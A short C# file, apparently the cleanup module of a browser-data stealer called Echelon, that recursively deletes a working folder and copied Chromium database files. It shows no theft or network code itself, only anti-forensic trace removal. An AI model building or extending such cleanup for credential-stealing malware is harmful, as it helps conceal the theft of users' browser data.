using System.IO;
using ChromV1;

namespace Echelon
{
    internal class Clean
    {
        public static void GetClean()
        {
            if (Directory.Exists(Help.dir)) Directory.Delete(Help.dir + "\\", true);

            if (File.Exists(Chromium.bd))
                File.Delete(Chromium.bd);
            if (File.Exists(Chromium.ls))
                File.Delete(Chromium.ls);
        }
    }
}
